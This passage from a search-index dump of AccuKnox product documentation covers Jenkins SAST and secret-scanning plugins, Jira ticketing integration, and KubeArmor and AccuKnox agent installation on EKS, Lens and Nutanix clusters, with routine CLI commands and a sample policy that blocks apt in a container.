Output","text":""},{"location":"integrations/jenkins-sast/#troubleshooting","title":"Troubleshooting","text":""},{"location":"integrations/jenkins-sast/#1-missing-sonarqube-token-or-host-url","title":"1. Missing SonarQube Token or Host URL","text":"<ul> <li> <p>Ensure both the SonarQube Token and SonarQube Host URL are provided in the Jenkins job configuration.</p> </li> <li> <p>Verify the accuracy of the provided credentials.</p> </li> </ul>"},{"location":"integrations/jenkins-sast/#2-scan-failure","title":"2. Scan Failure","text":"<ul> <li> <p>Check the Jenkins console output for error details.</p> </li> <li> <p>Ensure the SonarQube server is reachable from Jenkins and the project key is correct.</p> </li> </ul>"},{"location":"integrations/jenkins-sast/#3-upload-failure","title":"3. Upload Failure","text":"<ul> <li> <p>Verify network connectivity to the AccuKnox SaaS endpoint.</p> </li> <li> <p>Double-check the Tenant ID and AccuKnox Token to ensure they are accurate.</p> </li> <li> <p>Ensure the scan results are generated properly before attempting to upload.</p> </li> </ul>"},{"location":"integrations/jenkins-sast/#sonarqube-setup","title":"SonarQube Setup","text":"<p>Before running the AccuKnox SAST Jenkins Plugin, ensure your SonarQube is correctly configured. Follow the instructions from the SonarQube Jenkins integration documentation for setting up SonarQube in Jenkins. This includes:</p> <ol> <li> <p>Installing the SonarQube Scanner Plugin for Jenkins.</p> </li> <li> <p>Configuring SonarQube server details in Manage Jenkins &gt; Configure System.</p> </li> <li> <p>Adding the SonarQube Scanner as a build step in your Jenkins pipeline.</p> </li> </ol>"},{"location":"integrations/jenkins-sast/#conclusion","title":"Conclusion","text":"<p>Once the AccuKnox SAST Jenkins Plugin is set up, it seamlessly integrates SonarQube scans into Jenkins pipelines and sends the results to AccuKnox SaaS for centralized management. This ensures that security issues are captured and addressed during the CI/CD pipeline, enhancing the security posture of your application.</p>"},{"location":"integrations/jenkins-secret-scan/","title":"Jenkins Secret Scanning Integration","text":""},{"location":"integrations/jenkins-secret-scan/#overview","title":"Overview","text":"<p>The AccuKnox Secret Scanning Jenkins Plugin simplifies integrating secret scanning into Jenkins pipelines. This plugin uses TruffleHog to detect sensitive data such as API keys, tokens, and secrets in the source code. The detected secrets are then uploaded to AccuKnox SaaS for centralized visibility and management.</p>"},{"location":"integrations/jenkins-secret-scan/#key-features","title":"Key Features","text":"<ol> <li> <p>Secret Detection with TruffleHog: Scan repositories for sensitive information using TruffleHog.</p> </li> <li> <p>Results Upload: Seamlessly upload scan results to AccuKnox SaaS for centralized monitoring.</p> </li> <li> <p>Customizable Parameters: Configure scanning options, including excluded paths, branch selection, and additional TruffleHog arguments.</p> </li> </ol>"},{"location":"integrations/jenkins-secret-scan/#installation","title":"Installation","text":""},{"location":"integrations/jenkins-secret-scan/#current-installation-method","title":"Current Installation Method","text":"<ol> <li> <p>Download the Plugin:</p> </li> <li> <p>Download the <code>.hpi</code> file for the plugin from your internal repository or the provided location.</p> </li> <li> <p>Install the Plugin:</p> </li> <li> <p>Navigate to the Jenkins Dashboard.</p> </li> <li> <p>Go to Manage Jenkins &gt; Manage Plugins.</p> </li> </ol> <p></p> <ul> <li>Select the Advanced tab and upload the <code>.hpi</code> file using the Choose File option.</li> </ul> <p></p> <p></p> <ul> <li>Click Deploy to install the plugin.</li> </ul> <p></p> <ul> <li>Restart Jenkins if prompted.</li> </ul>"},{"location":"integrations/jenkins-secret-scan/#configuration","title":"Configuration","text":""},{"location":"integrations/jenkins-secret-scan/#job-configuration","title":"Job Configuration","text":"<ol> <li> <p>Add Build Step:</p> </li> <li> <p>Open the Jenkins job configuration.</p> </li> <li> <p>Under the Build section, click Add build step and select AccuKnox Secret Scan.</p> </li> </ol> <p></p> <ol> <li> <p>Configure Plugin Parameters:</p> </li> <li> <p>The plugin provides the following configuration options:</p> <ul> <li> <p>Token: AccuKnox API token for authentication.</p> </li> <li> <p>Tenant ID: Your AccuKnox tenant ID.</p> </li> <li> <p>Label: A label to associate the scan with specific context.</p> </li> <li> <p>Endpoint: AccuKnox API endpoint.</p> </li> <li> <p>Results Path: Path to save TruffleHog results (default: <code>trufflehog-results.json</code>).</p> </li> <li> <p>Fail on Secrets: Mark the build as failed if secrets are detected.</p> </li> <li> <p>Branch: The branch of the repository to scan.</p> </li> <li> <p>Exclude Paths: Paths to exclude from the scan.</p> </li> <li> <p>Additional Arguments: Custom arguments to pass to TruffleHog.</p> </li> </ul> </li> </ol> <p></p>"},{"location":"integrations/jenkins-secret-scan/#running-the-scan","title":"Running the Scan","text":"<ol> <li> <p>Execution:</p> </li> <li> <p>Once configured, trigger the Jenkins job.</p> </li> <li> <p>The plugin:</p> <ul> <li> <p>Runs a Secret scan in the workspace.</p> </li> <li> <p>Saves the results to the specified path.</p> </li> <li> <p>If secrets are found, uploads the results to AccuKnox CSPM.</p> </li> </ul> </li> <li> <p>Sample Console Output:</p> </li> </ol> <pre><code>Starting AccuKnox Secret Scan...\nAccuKnox Secret Scan is running...\nSecrets found. Uploading results to AccuKnox CSPM...\nAccuKnox CSPM upload successful.\n</code></pre>"},{"location":"integrations/jenkins-secret-scan/#troubleshooting","title":"Troubleshooting","text":""},{"location":"integrations/jenkins-secret-scan/#1-no-results-found","title":"1. No Results Found","text":"<ul> <li> <p>If no secrets are detected:</p> </li> <li> <p>Verify that the source repository contains test secrets.</p> </li> <li> <p>Check the excluded paths and branch configuration.</p> </li> </ul>"},{"location":"integrations/jenkins-secret-scan/#2-api-upload-failure","title":"2. API Upload Failure","text":"<ul> <li> <p>Verify the AccuKnox API endpoint is correctly configured.</p> </li> <li> <p>Ensure the AccuKnox Token and Tenant ID are accurate.</p> </li> <li> <p>Check network connectivity to the AccuKnox SaaS endpoint.</p> </li> </ul>"},{"location":"integrations/jenkins-secret-scan/#3-command-errors","title":"3. Command Errors","text":"<ul> <li> <p>Ensure the TruffleHog Docker image is accessible from the Jenkins environment.</p> </li> <li> <p>Check workspace permissions and Docker installation.</p> </li> </ul>"},{"location":"integrations/jenkins-secret-scan/#example-configuration","title":"Example Configuration","text":"Parameter Example Value Token <code>my-accuknox-token</code> Tenant ID <code>my-tenant-id</code> Label <code>secret-scan-build-123</code> Endpoint <code>https://api.accuknox.com</code> Results Path <code>trufflehog-results.json</code> Branch <code>main</code> Exclude Paths <code>node_modules, tests</code> Additional Args <code>--regex --max-depth 2</code>"},{"location":"integrations/jenkins-secret-scan/#token-generation-for-accuknox","title":"Token Generation for AccuKnox","text":"<p>To generate the AccuKnox Token and obtain the Tenant ID:</p> <ol> <li> <p>Log in to AccuKnox.</p> </li> <li> <p>Navigate to Settings &gt; Tokens and create an AccuKnox token.</p> </li> <li> <p>Copy the generated token and store it securely for later use. For detailed steps, refer to How to Create Tokens.</p> </li> </ol>"},{"location":"integrations/jenkins-secret-scan/#conclusion","title":"Conclusion","text":"<p>By integrating the AccuKnox Secret Scanning Jenkins Plugin into your CI/CD pipeline, you ensure that sensitive information is identified and securely managed during development. The plugin streamlines secret scanning, centralizes findings in AccuKnox SaaS, and helps strengthen your organization's security posture.</p>"},{"location":"integrations/jira-cloud/","title":"Jira Cloud Integration","text":"<p>Integrate AccuKnox with Jira and receive AccuKnox alert notifications in your Jira accounts. With this integration, you can automate the process of generating Jira tickets with your existing security workflow.</p> <p>To set up this integration, you need to coordinate with your Jira administrator and gather the inputs needed to enable communication between AccuKnox and Jira.</p>"},{"location":"integrations/jira-cloud/#prerequisites","title":"Prerequisites","text":"<ul> <li>You need a Jira Site URL , Email, UserID &amp; API token, Project key for this integration.</li> <li>To create JIRA token go to https://id.atlassian.com/manage-profile/security/api-tokens, and click on create API token.</li> </ul> <ul> <li>Add a label to identify the token.</li> <li>Click Create to generate token.</li> </ul> JIRA integration for CWPP JIRA integration for CSPM <p>Your Jira Cloud is now integrated, and you can configure alert triggers for JIRA.</p>"},{"location":"integrations/jira-cloud/#steps-to-integrate","title":"Steps to Integrate:","text":"<ul> <li>Go to Channel Integration.</li> <li>Click integrate now on JIRA</li> </ul> <ul> <li> <p>Enter the following details to configure JIRA.</p> </li> <li> <p>Integration Name: Enter the name for the integration. You can set any name. e.g.,<code>Test JIRA</code></p> </li> <li>Site: Enter the site name of your organisation. e.g., <code>https://jiratest.atlassian.net/</code></li> <li>User Email: Enter your Jira account email address here.e.g., <code>jira@organisation.com</code></li> <li>Token: Enter the generated Token here from <code>https://id.atlassian.com/manage-profile/security/api-tokens. .e.g., kRVxxxxxxxxxxxxx39</code></li> <li>User ID: Enter your Jira user ID here. You can visit people section and search your name to see the User ID. For more details check here. e.g., <code>5bbxxxxxxxxxx0103780</code></li> <li>Project ID: Enter your Project key here, each project in an organisation starts with some keyvalue and is case sensitive. Breakdown of a jira ticket to identify Project ID: <code>https://[JIRA-SITE]/browse/[PROJECT ID]-1414</code>, e.g., <code>DEVSECOPS</code></li> <li>Issue Summary: Enter the summary for the JIRA tickets to be viewed in each JIRA tickets created. e.g., <code>Issue generated form High Severity Incidents on onboarded cluster.</code></li> <li>Issue Type: You can choose from the dropdown. i.e., <code>Story and Bug</code></li> <li> <p>Click Test to check if the entered details are being validated, If you receive Test Successful, you have entered a valid JIRA credentials.</p> </li> <li> <p>Click Save to save the Integration.</p> </li> </ul>"},{"location":"integrations/jira-cloud/#steps-to-integrate_1","title":"Steps to Integrate:","text":"<ul> <li>Navigate to the Integration section under the Settings tab.</li> <li>Select CSPM from the available options.</li> </ul> <ul> <li>Click Add Connection, then choose Jira Cloud from the dropdown under Type.</li> </ul> <ul> <li>Click Next.</li> </ul> <p>Enter the following details to configure JIRA:</p> <ul> <li>Integration Name: Provide a name for the integration (customize as desired). e.g., <code>Test JIRA</code></li> <li>Service Desk URL: Enter your organization\u2019s Jira site URL. e.g., <code>https://jiratest.atlassian.net/</code></li> <li>User Email: Enter the email address associated with your Jira account. e.g., <code>jira@organisation.com</code></li> <li>Secret: Enter the generated Token from here. e.g., <code>kRVxxxxxxxxxxxxx39</code></li> </ul> <p></p> <p>Now Setup Ticket Configuration</p> <ul> <li>Click on the Jira ticketing backend to add configuration.</li> </ul> <p></p> <p>Here, enter the following details:</p> <ul> <li>Configuration Name: Provide a name for this configuration. This name will be visible while creating tickets.</li> <li>Default Template: Choose a predefined template based on your requirements, or create a custom template tailored to your needs.</li> <li>Project Name: From the list, select the Jira project where tickets will be created.</li> <li>Issue Type: Select an issue type that categorizes the work (e.g., task, sub-task, bug, story).</li> </ul> <p>Mandatory/Custom Fields</p> <p>Each issue type includes various mandatory or custom fields that are critical to the overall management of issues within a project.</p> <ul> <li>Issue Type: Task</li> <li>Components: Defines the component(s) involved in the task, e.g., UI, Backend, Database.</li> <li>Project: The project to which the task is assigned (e.g., CNAPP, CSPM).</li> <li>Fix Versions: Indicates the version(s) in which the task is planned to be completed.</li> <li>Priority: Determines the urgency of the task (e.g., Low, Medium, High, Critical).</li> <li>Affects Versions: Specifies the versions impacted by the task.</li> </ul> <p></p> <ul> <li>Auto Maintain Tickets: Automatically manages ticket statuses to keep them updated without manual intervention.</li> <li> <p>Keep Syncing Closed Tickets: Ensures closed tickets are continuously synced for real-time accuracy across systems.</p> </li> <li> <p>Remap Priority: Assign a priority level based on your preferences.</p> </li> </ul> <p>Comment Analysis</p> <ul> <li>Comment Analysis Overview It helps automatically categorize comments to track issue progress and manage exceptions. Regex (Regular Expressions) can be used to identify patterns within comments.</li> <li>Key Fields<ul> <li>Regex: A regular expression used to filter comments.<ul> <li>Example: <code>waiting for approval|needs revision</code></li> </ul> </li> <li>Status Options<ul> <li>Active: Issue is currently being worked on.</li> <li>Fixed: Issue has been resolved.</li> <li>In-Progress: Ongoing work is noted in comments.</li> <li>Exception Request: Flags comments requesting special handling.</li> <li>Potential: Indicates a potential issue for further review.</li> <li>Wait for 3<sup>rd</sup> Party: Delays due to external dependencies.</li> <li>Duplicate: Marks comments indicating the issue is a duplicate.</li> </ul> </li> </ul> </li> <li> <p>Use Cases</p> <ul> <li>Progress Tracking: Automatically update status to In-Progress for relevant comments.</li> <li>Duplicate Issues: Flag duplicates based on comments like \"duplicate of issue #123\".</li> <li>Exceptions: Identify special requests through comments.</li> </ul> </li> <li> <p>Implementing Comment Analysis provides streamlines issue management and enhances visibility into project status.</p> </li> </ul> <p> + Click Save.</p> <p></p> <ul> <li>For more ticketing templates, refer to this.</li> </ul>"},{"location":"integrations/jira-cloud/#jira-assignee-support","title":"Jira Assignee Support","text":"<p>Users can now add Jira ticket Assignee as well when they create the ticket for any particular vulnerability or misconfiguration from the AccuKnox SaaS itself. To do this the users must follow the following steps:</p> <p>Step 1: Users first need to integrate their jira cloud using the instructions here\u00a0</p> <p>Step 2: After the integration the Users need to create the Configuration for the integration. For this users need to select the Integration-&gt;CSPM-&gt;jira Integration-&gt; Add configuration</p> <p></p> <p>Step 3: Now when the users select the project name in the Ticket configuration the assignee users will be listed. The users can select any name and save the ticket configuration after filling all other necessary fields.\u00a0</p> <p></p> <p>From now on the users can create the ticket with this particular configuration so that the ticket will be created with the assignee set to the name that\u00a0 was selected during the configuration.</p> <p>If the users want to change the assignee during the ticket creation that can also be done by clicking on the assignee section as shown below</p> <p></p> <p>NOTE</p> <p>If the user wants to set the tickets for multiple people then they will have to create multiple ticket configurations. Each configuration can be assigned to only one Assignee.</p> <p>SCHEDULE DEMO</p>"},{"location":"integrations/jira-server-cspm/","title":"Jira Integration","text":"<p>Integrate AccuKnox with Jira and receive AccuKnox alert notifications in your Jira accounts. With this integration, you can automate the process of generating Jira tickets with your existing security workflow.</p> <p>To set up this integration, you need to coordinate with your Jira administrator and gather the inputs needed to enable communication between AccuKnox and Jira.</p>"},{"location":"integrations/jira-server-cspm/#integration-of-jira","title":"Integration of JIRA:","text":""},{"location":"integrations/jira-server-cspm/#prerequisites","title":"Prerequisites","text":"<ul> <li>You need a Jira Site URL , Email, UserID &amp; API token, Project key for this integration.</li> <li>To create JIRA token go to https://id.atlassian.com/manage-profile/security/api-tokens, and click on create API token.</li> </ul>"},{"location":"integrations/jira-server-cspm/#steps-to-integrate","title":"Steps to Integrate:","text":"<ul> <li>Go to Channel Integration \u2192 CSPM.</li> <li>Click on add connector and select JIRA Server</li> </ul> <p>Enter the following details to configure JIRA.</p> <ul> <li>Integration Name: Enter the name for the integration. You can set any name. e.g.,<code>Test JIRA</code></li> <li>Service Desk URL: Enter the site name of your organisation. e.g., <code>https://jiratest.atlassian.net/</code></li> <li>Username: Enter your Jira account email address here.e.g., <code>jira@organisation.com</code></li> <li>Secret: Enter the generated Token here from <code>https://id.atlassian.com/manage-profile/security/api-tokens.</code> .e.g., <code>kRVxxxxxxxxxxxxx39</code></li> </ul> <p></p> <p>Click on the Jira ticketing backend to add configuration.</p> <p>Here Enter the following details:</p> <ul> <li>Configuration name: this name will be displayed under ticket configuration while creating tickets.</li> <li>Default template: to specify the of data that this configuration will be used for making tickets.</li> <li>Project name: From the list of project select the project where you want your tickets to be created.</li> <li>Issue Type: You can choose from the dropdown.</li> <li>Fill the priority mapping according to your choice and press Save.</li> </ul> <p>You can now configure Tickets to be created on JIRA.</p> <p>SCHEDULE DEMO</p>"},{"location":"integrations/ka-eks-add-on/","title":"KubeArmor EKS Add-on","text":"<p>Amazon Elastic Kubernetes Service (Amazon EKS) is a managed Kubernetes service provided by Amazon Web Services (AWS) which simplifies the process of running Kubernetes clusters by handling the underlying infrastructure and operational aspects. KubeArmor\u2019s integration with EKS can provide a user with a tool that can enforce security policies for them at the pod level as well as at the node level. Users can restrict all events related to network, process and file using these policies.</p> <p>In this article you will understand how to install KubeArmor on your EKS cluster using Amazon EKS add-on method.</p>"},{"location":"integrations/ka-eks-add-on/#from-aws-console","title":"From AWS Console","text":"<p>Once you've subscribed to Kubearmor on AWS Marketplace and completed the on-screen setup, you'll be directed to the Amazon EKS console. To begin in the Amazon EKS console, navigate to your EKS clusters and click on the \"Add-ons\" tab. From there, select \"Get more add-ons\" to locate the KubeArmor EKS add-ons in the cluster settings of your existing EKS clusters. You can use the search bar to find \"KubeArmor\" and then follow the on-screen instructions to enable the Kubearmor add-on for your Amazon EKS cluster.</p> <p></p>"},{"location":"integrations/ka-eks-add-on/#from-aws-cli","title":"From AWS-CLI","text":"<p>To enable the Kubearmor add-on for your Amazon EKS cluster, follow these steps:</p> <p>Open your workspace and execute the command below. Make sure to replace <code>$YOUR_CLUSTER_NAME</code> and <code>$AWS_REGION</code> with the actual name of your Amazon EKS cluster and its respective AWS region.</p> <pre><code>aws eks create-addon --addon-name accuknox_KubeArmor --cluster-name $YOUR_CLUSTER_NAME --region $AWS_REGION\n</code></pre> <p>You'll receive a response with information about the add-on's status, like its name, cluster name, and version. The add-on will be in the \"CREATING\" status initially.</p> <p>To check the installation status of the Kubearmor add-on, use the following command:</p> <pre><code>aws eks describe-addon --addon-name accuknox_KubeArmor --cluster-name $YOUR_CLUSTER_NAME --region $AWS_REGION\n</code></pre> <p>Once the add-on becomes active, its status will change to \"ACTIVE.\" This command will provide details similar to those in the response above, including the status, version, and creation date.</p> <p>To disable the Kubearmor add-on, you can execute the following command from AWS CLI</p> <pre><code>aws eks delete-addon --addon-name accuknox_KubeArmor --cluster-name $YOUR_CLUSTER_NAME --region $AWS_REGION\n</code></pre> <p>SCHEDULE DEMO</p>"},{"location":"integrations/lens-ak/","title":"Mirantis Lens Integration with AccuKnox","text":"<p>To deploy the AccuKnox agents through Lens and onboard to AccuKnox SaaS,</p> <p>Step 1: Navigate to File \u2192 Preferences or press Ctrl+Comma to open the Preferences menu and select the Kubernetes tab.</p> <p></p> <p>Step 2: Click on \u201cAdd Custom Helm Repo\u201d and enter the following info:</p> <ul> <li>Name: accuknox-agents</li> <li>URL: <code>http://agents.accuknox.com</code></li> </ul> <p>Click on Add</p> <p></p> <p>Step 3: Navigate to your cluster on Lens, goto Helm \u2192 Charts and search accuknox-agents. Select the \u201caccuknox-agents\u201d chart and click on Install. (Press ctrl+R to reload if you can\u2019t find it)</p> <p></p> <p>Step 4: On the AccuKnox SaaS, Navigate to Settings \u2192 Manage Cluster and click on \u201cOnboard now\u201d</p> <p></p> <p>Step 5: In the next screen, enter a name for the cluster and click on \u201cSave and Next\u201d</p> <p></p> <p>Step 6: Now, scroll down to view the helm chart values for onboarding the cluster. Copy these values to use in the Helm Chart installation in Lens</p> <p></p> <p>Step 7: Copy the following values from the AccuKnox SaaS and paste in Helm Chart values in Lens:</p> <p><pre><code>joinToken=\"&lt;token-from-saas&gt;\"\nspireHost=\"spire.demo.accuknox.com\"\nppsHost=\"pps.demo.accuknox.com\"\nknoxGateway=\"knox-gw.demo.accuknox.com:3000\"\n</code></pre> Click on Install</p> <p></p> <p>Step 8: Wait for a few minutes for all the AccuKnox agents to be up. Then click on Next in the AccuKnox SaaS to view your workloads.</p> <p></p> <p>The cluster has been onboarded to AccuKnox SaaS successfully.</p>"},{"location":"integrations/lens-ka/","title":"Lens Integration with KubeArmor","text":"<p>Follow the below steps to add the KubeArmor helm chart to Lens and deploy it,</p> <p>Step 1: Navigate to File \u2192 Preferences or press Ctrl+Comma to open the Preferences menu and select the Kubernetes tab.</p> <p></p> <p>Step 2: Click on \u201cAdd Custom Helm Repo\u201d and enter the following info:</p> <ul> <li>Name: kubearmor</li> <li>URL: <code>https://kubearmor.github.io/charts</code></li> </ul> <p>Click on Add</p> <p></p> <p>Step 3: Navigate to your cluster on Lens, goto Helm \u2192 Charts and search KubeArmor. Select the \u201ckubearmor-operator\u201d and click on Install. (Press ctrl+R to reload if you can\u2019t find it)</p> <p></p> <p>Step 4: In the Helm chart tab that opens, do the following:</p> <ul> <li>Set the value <code>autoDeploy: true</code></li> <li>Select a namespace to deploy, i.e. kubearmor</li> </ul> <p>Finally click on Install</p> <p></p> <p>Wait for the operator to finish deploying the necessary components. This will deploy KubeArmor on the cluster with the default options.</p>"},{"location":"integrations/lens-ka/#sample-use-case","title":"Sample Use Case","text":"<p>For this example, we are making use of a Wordpress-mysql deployment which can be started using the below command:</p> <pre><code>kubectl apply -f https://raw.githubusercontent.com/kubearmor/KubeArmor/main/examples/wordpress-mysql/wordpress-mysql-deployment.yaml\n</code></pre> <p>To demonstrate, here we will make use of the policy below to prevent the execution of <code>apt</code> binary:</p> <p><pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorPolicy\nmetadata:\n  name: ksp-wordpress-block-process\n  namespace: wordpress-mysql\nspec:\n  severity: 3\n  selector:\n    matchLabels:\n      app: wordpress\n  process:\n    matchPaths:\n    - path: /usr/bin/apt\n    - path: /usr/bin/apt-get\n  action:\n    Block\n</code></pre> This policy is created based on NIST guidelines which specify that package management processes should not be allowed to execute inside a container at production. KubeArmor can help enforce this by denying the execution of these binaries.</p> <p>Step 1: Apply the policy by opening a \"create resource\" tab(Press the + button at the bottom)</p> <p></p> <p>Step 2: Copy the policy from above and paste into the tab. Then click on Create &amp; Close to apply the policy.</p> <p></p> <p>Step 3: Open a terminal session using the + button and exec inside the container</p> <p>Get the container name: <pre><code>kubectl get pods -n wordpress-mysql\n</code></pre> Now exec into the wordpress container by specifying its name identified from the previous command: <pre><code>kubectl exec -it -n wordpress-mysql &lt;wordpress-pod-name&gt; -- bash\n</code></pre> Step 4: Try executing <code>apt</code> inside the container</p> <p>Sample Output: <pre><code>PS C:\\Users\\User&gt; kubectl exec -it wordpress-64f98f8759-k6dt2 -n wordpress-mysql -- bash\nroot@wordpress-64f98f8759-k6dt2:/var/www/html# apt\nbash: /usr/bin/apt: Permission denied\nroot@wordpress-64f98f8759-k6dt2:/var/www/html#\n</code></pre></p> <p>The permission is denied since we have applied a policy to block the execution of apt binary.</p> <p>The applied policy can be found by navigating to Custom Resources \u2192 security.kubearmor.com \u2192 Kube Armor Policy. From here, the policy can be edited as required or removed.</p> <p></p> <p>More information about the structure of policies and some examples can be found in KubeArmor Docs</p>"},{"location":"integrations/nutanix-accuknox/","title":"Nutanix Installation with KubeArmor","text":"<p>AccuKnox runtime security for Kubernetes aids in discovering the application behavior of your workload and offers the capability to enforce security policies. AccuKnox automatically detects and suggests Behavioral Policies based on application observability, such as file system access for processes and processes that are accessing the network.</p> <p>AccuKnox leverages KubeArmor to implement runtime security policies, utilizing eBPF and LSMs (SELinux, BPF LSM, AppArmor). LSMs serve as a checkpoint based on the applied policies, scrutinizing all events and system calls against these policies before they interact with kernel objects. KubeArmor ensures that any event not compliant with the policies is prevented from executing in the userspace, thus maintaining a secure environment for your applications to operate.</p> <p>AccuKnox offers the subsequent enterprise functionalities to enhance runtime security:</p> <ul> <li>Auto-Discovered Behavioural Policies</li> <li>Recommendation of Hardening Policies based on compliance framework - MITRE, NIST, PCI-DSS, CIS</li> <li>Inventory View of Application</li> <li>Network Graph View of the Application</li> <li>Network micro-segmentation in the application</li> <li>Hardening of the Secrets Managers like Hashicorp Vault, CyberArk Conjur</li> <li>GitOps-based Version Control for Policy Lifecycle Management</li> <li>Rollback of recently changed Policy governing App Behavior</li> <li>On-the-fly detection of change in App Behavior through Policies</li> <li>Multi-tenant, Multi-Cluster, RBAC for user management</li> <li>Comprehensive Dashboard across workloads running in Managed/Unmanaged Cluster, Containerized environment, VM or Baremetal</li> <li>Integration with Registries for Container Image Vuln Scan</li> <li>Telemetry aggregation (Process executed, File accessed, Network connections made) and Alerts events (Audit, Block)</li> <li>Integration to SIEM for security events and Notification tool</li> </ul> <p>The utilization of the following AccuKnox agents assists in delivering the enterprise features:</p> <p>Agents operator: It will detect the environment of the k8s that is installed and based on that, it will pull all the AccuKnox Agents for Installation.</p> <p>Discovery Engine: AccuKnox Discovery Engine leverages the pod visibility provided by KubeArmor to automatically generate System and Network Policies.</p> <p>Feeder Service: The feeder service sends information from the Client Cluster to the AccuKnox SaaS Control Plane. Feeder Service is an agent that runs on every node, collects telemetry/alert events from source systems and messages, and emits them to the Messaging Cluster for Storage and Analysis.</p> <p>Policy Enforcement Agent: AccuKnox\u2019s Policy Enforcement Agent enforces the policies by leveraging KubeArmor. The policy not only keeps track of the policies but is capable of doing tasks such as applying policies, denying policies, updating policies, and deleting the policies.</p> <p>Shared Informer Agent: Shared Informer Agent watches all the changes occurring in Kubernetes entities such as Pods, Nodes, Namespaces, Endpoints, and Services.</p>"},{"location":"integrations/nutanix-accuknox/#before-you-begin","title":"Before you Begin","text":"<p>This procedure requires the following items and configurations:</p> <ul> <li> <p>A fully configured and running Amazon EKS cluster with administrative privileges.</p> </li> <li> <p>The current version of DKP Enterprise is installed on your cluster.</p> </li> <li> <p>Ensure you have installed <code>kubectl</code> in your Management cluster.</p> </li> </ul> <p>In this case, we will be using D2iQ managed cluster created from the D2iQ console, You can use user attached cluster as well</p> <p></p>"},{"location":"integrations/nutanix-accuknox/#steps-to-onboard-cluster","title":"Steps to onboard cluster","text":"<p>Step 1: When the cluster is provisioned successfully &gt; click on Actions from the upper right corner download the KubeConfig and export it to kubeconfig environment variable</p> <p></p> <pre><code>export KUBECONFIG=dkp-aditya-kubeconfig.yaml\n</code></pre> <p>Step 2: From the application catalog enable KubeArmor</p> <p></p> <p>Step 3: Login to AccuKnox Saas &gt; Navigate to settings and click on manage clusters</p> <p></p> <p>Step 4: Click on Onboard Now to onboard a new cluster and In the next screen give a name to your cluster then click on Save &amp; Next</p> <p></p> <p>Step 5: In the onboarding steps skip the first step as we have already added \u201cKubeArmor\u201d from the DKP catalog, Follow the \u201cInstall AccuKnox Agents\u201d to onboard your cluster</p> <p></p> <p>Step 6: Copy the command and execute it in CLI</p> <pre><code>helm upgrade --install accuknox-agents oci://public.ecr.aws/k9v9d5v2/accuknox-agents --version \"v0.2.12\" --set joinToken=\"38d851ba-2660-4aa3-b488-0cfb666bdb5e\" --set spireHost=\"spire.demo.accuknox.com\" --set ppsHost=\"pps.demo.accuknox.com\" --set knoxGateway=\"knoxgw.demo.accuknox.com:3000\" -n accuknox-agents --create-namespace\nRelease \"accuknox-agents\" does not exist. Installing it now.\nPulled: public.ecr.aws/k9v9d5v2/accuknox-agents:v0.2.12\nDigest: sha256:0bccba7c90fd5b844c84010613941da1938020336fa50c6ed9b1d045c37bb8ea\nNAME: accuknox-agents\nLAST DEPLOYED: Tue Apr 23 11:11:21 2024\nNAMESPACE: accuknox-agents\nSTATUS: deployed\nREVISION: 1\nTEST SUITE: None\n</code></pre> <p>Step 7: Verify if all the agents are up and running</p> <pre><code>kubectl get po -n accuknox-agents\nNAME                                        READY   STATUS    RESTARTS   AGE\nagents-operator-6cf7ccb7c4-zl58p            1/1     Running   0          3m18s\ndiscovery-engine-86c7fcc48c-bgvg8           5/5     Running   0          3m18s\nfeeder-service-78bfcc75bb-xxfqt             1/1     Running   0          2m45s\npolicy-enforcement-agent-7c9cddddf6-6rwv7   1/1     Running   0          2m44s\nshared-informer-agent-787465dc55-wlzm8      1/1     Running   0          2m43s\n</code></pre> <p>The agents are up and running.</p>"},{"location":"integrations/nutanix-accuknox/#expected-outcome","title":"Expected Outcome","text":"<p>After the Onboarding Process is complete user can utilize the following features of AccuKnox SaaS to protect their cloud workload at runtime:</p>"},{"location":"integrations/nutanix-accuknox/#cloud-workloads","title":"Cloud Workloads","text":"<p>Users can view all the workloads within the cluster through the cloud workload graph view.</p> <p></p>"},{"location":"integrations/nutanix-accuknox/#application-behavior","title":"Application Behavior","text":"<p>AccuKnox SaaS monitors cluster workload behavior using KubeArmor and AccuKnox Agents, installed as DaemonSets. Information is collected at the pod-level granularity, allowing users to access details for each pod across various namespaces. Workload behavior is presented through both list and graphical views</p> <p></p>"},{"location":"integrations/nutanix-accuknox/#list-view","title":"List view","text":"<p>In the list view, users can access the selected pod's application behavior through three types of lists:</p> <p>File Observability: This list provides information about file access occurring inside the pod. It includes details such as which process is accessing which file within the pod. Additionally, it indicates the status of the access, whether it's allowed, audited, or denied.</p> <p>Process Observability: This list displays the processes executing within the pod, along with information about which pods or containers are executing those processes. It also provides details about processes that are blocked from execution within the pod.</p> <p>Network Observability: Network Observability presents the ingress and egress connections entering and leaving the pod. It offers information regarding port numbers, the source of ingress connections, and the destination to which egress connections are intended.</p> <p></p>"},{"location":"integrations/nutanix-accuknox/#cwpp-dashboard","title":"CWPP Dashboard","text":"<p>The AccuKnox CWPP Dashboard offers a comprehensive overview of runtime protection for clusters through various informative widgets. These widgets include:</p> <ul> <li> <p>Alerts Summary: Provides a summarized count of alerts generated in the cluster or a specific namespace. Details include total alerts, blocked alerts (from system block policies), and audited alerts (from audit policies).</p> </li> <li> <p>Compliance Summary: Displays the compliance benchmarks applied to the cluster/namespace through KubeArmor's hardening policies. Presents information about MITRE, NIST, CIS, PCI-DSS benchmarks.</p> </li> <li> <p>Compliance Alerts: Graphically represents compliance alerts generated in the cluster/namespace, using distinct color coding for various compliance benchmarks like MITRE, NIST, PCI-DSS, etc.</p> </li> <li> <p>Namespace Severity: Offers a summary of attack severity attempted in the different namespaces within the cluster.</p> </li> <li> <p>Top 10 Policies by Alerts Count: Presents a graphical representation of the top 10 policies for which alerts are generated in the cluster/namespace. Useful for identifying high-alert generating policies.</p> </li> <li> <p>Namespace Alerts: Displays alerts specific to the selected namespace within the cluster, providing detailed information about the alerts.</p> </li> <li> <p>Pod Alerts: Offers insights into alerts originating from the pods running within the cluster/namespace.</p> </li> <li> <p>Alert-based Operations: Graphically represents alert-triggering operations such as file access, process blocks, and audits, giving users an overview of the types of alerts generated.</p> </li> <li> <p>Alerts based on Severity: Provides information on attack severity levels that were mitigated by the runtime protection policies within the chosen cluster/namespace.</p> </li> </ul> <p></p>"},{"location":"integrations/nutanix-accuknox/#policy-enforcement","title":"Policy Enforcement","text":"<p>The Policies section provides users with information about the runtime protection policies applied in the cluster. These policies are categorized as Discovered, Active, Inactive, Pending, Hardening, and more. Users can view policies based on the cluster, namespace, and policy type selected using the filters displayed on the page.</p> <p>AccuKnox offers the option to view policies related to a specific namespace and workload. In addition to discovered and hardening policies, users can also create custom policies using the policy editor tool.</p> 